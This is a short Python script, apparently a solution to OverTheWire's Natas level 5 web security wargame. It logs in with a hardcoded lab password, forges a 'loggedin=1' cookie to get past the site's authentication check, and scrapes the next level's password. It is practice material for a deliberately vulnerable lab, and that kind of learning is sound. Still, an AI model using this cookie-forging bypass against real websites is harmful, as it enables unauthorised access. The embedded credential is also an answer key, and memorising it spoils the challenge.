#cookies vlaue
import requests
import re

user="natas5"
password="Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD"
url='http://%s.natas.labs.overthewire.org' % user

header={'loggedin':'1'}
r=requests.Session()
response=r.get(url,auth=(user,password),cookies=header)
content=response.text
#print(content)
print (re.findall('The password for natas6 is (.*)',content)[0])